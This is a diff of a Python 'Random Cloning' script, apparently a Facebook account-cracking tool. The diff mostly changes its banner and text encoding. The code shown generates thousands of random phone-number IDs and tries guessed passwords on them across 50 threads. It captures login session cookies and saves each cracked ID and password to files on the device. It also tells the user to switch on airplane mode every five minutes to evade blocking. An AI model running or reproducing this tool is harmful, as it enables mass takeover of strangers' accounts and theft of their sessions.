@@ -88,26 +88,28 @@ bu = current.month
 ha = current.day
 today = date.today()
 logo = ("""
-
-â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ     
-â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆ  â–ˆâ–ˆ      
-â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ       
-â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆ  â–ˆâ–ˆ      
-â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ     
-           
- \033[1;93mÃ—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—\033[1;93mÃ—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—\033[1;93mÃ—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—
- \033[1;93m|     \033[1;96m[âœ“] CREATED BY\33[0;m   : \033[1;96m á¥¬ðŸ˜ˆá­„MONIRðŸ˜ˆá­„HOSSAIN         \033[1;93m|
- \033[1;93m|     \033[1;32m[âœ“] FACEBOK      : \033[1;34m MD MONIR HASSAN             \033[1;93m|
- \033[1;93m|     \033[1;35m[âœ“] GITHUB       :  \033[1;35mMONIR-HOSSAIN           \033[1;93m    |
- \033[1;93m|     \033[1;36m[âœ“] TOOL STATUS  : \033[1;36m Random Cloning \033[1;93m             |
- \033[1;93m|     \033[1;35m[âœ“] TEAM         :  \033[1;35m{ 1 }             \033[1;93m          |
- \033[1;93m|     \033[1;36m[âœ“] TOOL VIRSION :  \033[1;36m1.0                         \033[1;93m|
- \033[1;93mÃ—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—\033[1;93mÃ—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—\033[1;93mÃ—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—
- \033[1;91m[\033[1;97mâ€¢\033[1;91m]\033[1;32m PLZ SAPPORT ME BRO....
- \033[1;91m[\033[1;97mâ€¢\033[1;91m]\033[1;32m BLACK MONIR HOSSAIN 
- \033[1;93mÃ—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—\033[1;93mÃ—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—\033[1;93mÃ—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—""")
+888888b.   888             d8888  .d8888b.  888    d8P        888    d8P  8888888 888b    888  .d8888b.  
+888  "88b  888            d88888 d88P  Y88b 888   d8P         888   d8P     888   8888b   888 d88P  Y88b 
+888  .88P  888           d88P888 888    888 888  d8P          888  d8P      888   88888b  888 888    888 
+8888888K.  888          d88P 888 888        888d88K     888   888d88K       888   888Y88b 888 888        
+888  "Y88b 888         d88P  888 888        8888888b  8888888 8888888b      888   888 Y88b888 888  88888 
+888    888 888        d88P   888 888    888 888  Y88b   888   888  Y88b     888   888  Y88888 888    888 
+888   d88P 888       d8888888888 Y88b  d88P 888   Y88b        888   Y88b    888   888   Y8888 Y88b  d88P 
+8888888P"  88888888 d88P     888  "Y8888P"  888    Y88b       888    Y88b 8888888 888    Y888  "Y8888P88 
+                                                                                                                      
+ \033[1;93m×××××××××××××××××\033[1;93m××××××××××××××
+ \033[1;93m|\033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m MONIR HOSSAIN
+ \033[1;93m|\033[1;32m[✓] FACEBOK      : \033[1;34m MD MONIR HASSAN
+ \033[1;93m|\033[1;35m[✓] GITHUB       :  \033[1;35mMONIR-HOSSAIN
+ \033[1;93m|\033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning
+ \033[1;93m|\033[1;35m[✓] TEAM         :  \033[1;35m{ 1 }
+ \033[1;93m|\033[1;36m[✓] TOOL VIRSION :  \033[1;36m1.0
+ \033[1;93m×××××××××××××××××\033[1;93m××××××××××××××
+ \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m PLZ SAPPORT ME BRO....
+ \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m BLACK MONIR HOSSAIN 
+ \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××""")
 def linex():
-	print('\033[1;93m Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—')
+	print('\033[1;93m ×××××××××××××××××××××××××××××××××')
 loop = 0
 oks = []
 cps = []
@@ -164,31 +166,31 @@ for xd in range(10000):
 def samiya(uid):
     if len(uid)==15:
         if uid[:10] in ['1000000000']       :shanto = ' (*-*) 2009'
-        elif uid[:9] in ['100000000']       :shanto = 'âˆš 2009'
-        elif uid[:8] in ['10000000']        :shanto = 'âˆš 2009'
-        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:shanto = 'âˆš 2009'
+        elif uid[:9] in ['100000000']       :shanto = '√ 2009'
+        elif uid[:8] in ['10000000']        :shanto = '√ 2009'
+        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:shanto = '√ 2009'
         elif uid[:7] in ['1000006','1000007','1000008','1000009']:shanto = ' 2010'
-        elif uid[:6] in ['100001']          :shanto = 'âˆš 2010/2011'
-        elif uid[:6] in ['100002','100003'] :shanto = 'âˆš 2011/2012'
-        elif uid[:6] in ['100004']          :shanto = 'âˆš 2012/2013'
-        elif uid[:6] in ['100005','100006'] :shanto = 'âˆš 2013/2014'
-        elif uid[:6] in ['100007','100008'] :shanto = 'âˆš 2014/2015'
-        elif uid[:6] in ['100009']          :shanto = 'âˆš 2015'
-        elif uid[:5] in ['10001']           :shanto = 'âˆš 2015/2016'
-        elif uid[:5] in ['10002']           :shanto = 'âˆš 2016/2017'
-        elif uid[:5] in ['10003']           :shanto = 'âˆš 2018/2019'
-        elif uid[:5] in ['10004']           :shanto = 'âˆš 2019/2020'
-        elif uid[:5] in ['10005']           :shanto = 'âˆš 2020'
-        elif uid[:5] in ['10006','10007','']:shanto = 'âˆš 2021'
-        elif uid[:5] in ['10008']           :shanto = 'âˆš 2022'
-        elif uid[:5] in ['10009']           :shanto = 'âˆš 2023'
+        elif uid[:6] in ['100001']          :shanto = '√ 2010/2011'
+        elif uid[:6] in ['100002','100003'] :shanto = '√ 2011/2012'
+        elif uid[:6] in ['100004']          :shanto = '√ 2012/2013'
+        elif uid[:6] in ['100005','100006'] :shanto = '√ 2013/2014'
+        elif uid[:6] in ['100007','100008'] :shanto = '√ 2014/2015'
+        elif uid[:6] in ['100009']          :shanto = '√ 2015'
+        elif uid[:5] in ['10001']           :shanto = '√ 2015/2016'
+        elif uid[:5] in ['10002']           :shanto = '√ 2016/2017'
+        elif uid[:5] in ['10003']           :shanto = '√ 2018/2019'
+        elif uid[:5] in ['10004']           :shanto = '√ 2019/2020'
+        elif uid[:5] in ['10005']           :shanto = '√ 2020'
+        elif uid[:5] in ['10006','10007','']:shanto = '√ 2021'
+        elif uid[:5] in ['10008']           :shanto = '√ 2022'
+        elif uid[:5] in ['10009']           :shanto = '√ 2023'
         else:shanto=''
     elif len(uid) in [9,10]:
-        shanto = ' âˆš 2008/2009'
+        shanto = ' √ 2008/2009'
     elif len(uid)==8:
-        shanto = 'âˆš 2007/2008'
+        shanto = '√ 2007/2008'
     elif len(uid)==7:
-        shanto = 'âˆš 2006/2007'
+        shanto = '√ 2006/2007'
     else:shanto=''
     return shanto
     
@@ -201,16 +203,16 @@ def xxr():
     os.geteuid
     os.system("clear")
     print(logo)
-    print(f' \033[1;91m[\033[1;97mâ€¢\033[1;91m]\033[1;92m Example : {xr}019,017,018,92302,92301,91778{x}')
-    print(" \033[1;93m Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—")
+    print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Example : {xr}019,017,018,92302,92301,91778{x}')
+    print(" \033[1;93m ××××××××××××××××××××××××××××××××××××××××××")
     rk1 = '0171'
     rk2 = '0172'
     rk3 = '0175'
     code = random.choice([rk1,rk2,rk3])                      
-    pww = input(f' \033[1;91m[\033[1;97mâ€¢\033[1;91m]\033[1;92m Choose : ')
+    pww = input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Choose : ')
     os.system('clear')
     print(logo)
-    limit = int(input(f' \033[1;91m[\033[1;97mâ€¢\033[1;91m]\033[1;92m EXAMPLE : 2000, 3000, 50000 \n \033[1;93mÃ—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã— \n \033[1;91m[\033[1;97mâ€¢\033[1;91m]\033[1;92m PUT CLONING LIMIT: '))
+    limit = int(input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m EXAMPLE : 2000, 3000, 50000 \n \033[1;93m××××××××××××××××××××××××××××××× \n \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m PUT CLONING LIMIT: '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
@@ -220,18 +222,18 @@ def xxr():
     HamiiID = []
     print("")
     for bilal in range(passx):
-        pww = input(f"\033[1;91m[\033[1;97mâ€¢\033[1;91m]\033[1;92m Enter Password {bilal+1} : ")
+        pww = input(f"\033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Enter Password {bilal+1} : ")
         HamiiID.append(pww)
     with ThreadPool(max_workers=50) as manshera:
         clear()
         tl = str(len(user))
-        print(f' \033[1;91m[\033[1;97mâ€¢\033[1;91m]\033[1;94m TOTAL IDS: {xr}'+tl)
-        print(f'{x} \033[1;91m[\033[1;97mâ€¢\033[1;91m]\033[1;94m THE PROCESS HAS BEEN STARTED')
-        print(f' \033[1;91m[\033[1;97mâ€¢\033[1;91m]\033[1;94m WORK CUNTRY \033[1;97m: \033[1;96mBANGLADESH')
-        print(f' \033[1;91m[\033[1;97mâ€¢\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m á¥¬ðŸ˜ˆá­„MONIR ðŸ˜ˆá­„HOSSAIN')
-        print(f' \033[1;91m[\033[1;97mâ€¢\033[1;91m]\033[1;94m USE NETWORK  \033[1;97m:  \033[1;96m2G, 3G, 4G, 5G ')
-        print(f' \033[1;91m[\033[1;97mâ€¢\033[1;91m]\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
-        print(f" \033[1;93mÃ—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—")
+        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOTAL IDS: {xr}'+tl)
+        print(f'{x} \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m THE PROCESS HAS BEEN STARTED')
+        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m WORK CUNTRY \033[1;97m: \033[1;96mBANGLADESH')
+        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m MONIR HOSSAIN')
+        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m USE NETWORK  \033[1;97m:  \033[1;96m2G, 3G, 4G, 5G ')
+        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
+        print(f" \033[1;93m××××××××××××××××××××××××××××××××××")
         for love in user:
             pwx = [love[1:]]
             uid = code+love
@@ -239,7 +241,7 @@ def xxr():
                 pwx.append(Eman)
                 pwx.append(love)
             manshera.submit(rcrack,uid,pwx,tl)
-    print(f"\n{x} \033[1;93mÃ—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—Ã—")
+    print(f"\n{x} \033[1;93m××××××××××××××××××××××××××××××××")
 def rcrack(uid,pwx,tl):
     #print(user)
     global loop
@@ -285,15 +287,15 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m [á¥¬ðŸ˜ˆá­„MONIR ðŸ˜ˆá­„HOSSAIN-OKðŸ’‰] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie ðŸª= \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print(f'\r\r{G1}[MONIR-OK] {cid} | {ps}')
                 cek_apk(session,coki)
-                open('/sdcard/á¥¬ðŸ˜ˆá­„MONIR ðŸ˜ˆá­„HOSSAIN-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/HOSSAIN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                open('/sdcard/á¥¬ðŸ˜ˆá­„MONIR ðŸ˜ˆá­„HOSSAIN-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/HOSSAIN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
